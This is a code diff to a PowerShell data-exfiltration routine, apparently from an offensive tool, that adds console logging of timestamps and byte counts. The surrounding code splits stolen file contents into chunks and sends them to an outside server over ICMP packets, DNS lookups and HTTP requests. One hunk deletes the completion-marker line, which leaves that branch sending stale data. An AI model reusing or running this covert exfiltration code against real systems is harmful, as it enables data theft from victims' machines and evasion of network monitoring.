@@ -52,7 +52,8 @@ function Invoke-Exfiltration {
     $remainder=$len%$split;
     $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
     $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
-
+    $datetime = Get-Date
+    Write-Host "Sending" $len "bytes -- started at" $datetime
 
     # determine exfil type and send data;
 	
@@ -61,6 +62,7 @@ function Invoke-Exfiltration {
       
         $IE = new-object -com internetexplorer.application;
         $q = Send-ICMPPacket $data
+        write-host $data
 
         for($i=0; $i-lt($repeat-1); $i++){
             
@@ -100,7 +102,11 @@ function Invoke-Exfiltration {
     
         $i = $i + 1
         $data = $jobid + '|!|' + $i + '|!|DONE'
+        $datetime = Get-Date
+        Write-Host "Completed at" $datetime
         $q = Send-ICMPPacket $data
+
+
         };
 
         
@@ -121,6 +127,8 @@ function Invoke-Exfiltration {
     
         $i = $i + 1
         $data = $jobid + '|!|' + $i + '|!|DONE'
+        $datetime = Get-Date
+        Write-Host "Completed at" $datetime
         $q = Send-DNSRequest $server $data $jobid
        }	
 
@@ -142,6 +150,8 @@ function Invoke-Exfiltration {
 
         $i = $i + 1
         $data = $jobid + '|!|' + $i + '|!|DONE'
+        $datetime = Get-Date
+        Write-Host "Completed at" $datetime
         $q = Send-HTTPRequest $data $IE
         }
     
@@ -160,7 +170,8 @@ function Invoke-Exfiltration {
         };
     
         $i = $i + 1
-        $data = $jobid + '|!|' + $i + '|!|DONE'
+        $datetime = Get-Date
+        Write-Host "Completed at" $datetime
         $q = Send-ICMPPacket $data
         };
 }
@@ -203,12 +214,14 @@ function Send-DNSRequest {
     for($i=0; $i-lt($repeat); $i++){
         $str = $data.Substring($i*$Split,$Split);
         $str = $jobid + $str + '.' + $dns;
+        write-host $str
         #$q = nslookup -querytype=A $str $server -timeout= 5;
         $q = Resolve-DnsName -Type A -Server $server -Name $str -QuickTimeout -ErrorAction SilentlyContinue
     };
     if($remainder){
         $str = $data.Substring($len-$remainder);
         $str = $jobid + $str + '.' + $dns;
+        write-host $str
         #$q = nslookup -querytype=A $str $server -timeout= 5;
         $q = Resolve-DnsName -Type A -Server $server -Name $str -QuickTimeout -ErrorAction SilentlyContinue
 
